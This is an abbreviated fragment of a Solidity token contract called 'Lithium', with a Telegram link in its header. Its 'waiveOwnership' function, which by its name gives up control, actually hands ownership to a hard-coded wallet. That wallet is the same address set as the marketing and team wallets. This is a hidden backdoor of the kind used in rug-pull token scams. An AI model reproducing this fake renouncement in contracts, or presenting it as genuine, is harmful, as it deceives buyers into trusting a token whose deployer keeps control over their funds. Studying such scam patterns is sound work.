...
/**
Telegram : https://t.me/LithiumPortal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x8D1695Cb2B338c14A5Ad6aBCd4A4205263441261);
    }
...
contract Lithium is Context, IERC20, Ownable {
    ...
    string private _symbol = "Lithium";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x8D1695Cb2B338c14A5Ad6aBCd4A4205263441261);
    address payable private teamWalletAddress = payable(0x8D1695Cb2B338c14A5Ad6aBCd4A4205263441261);
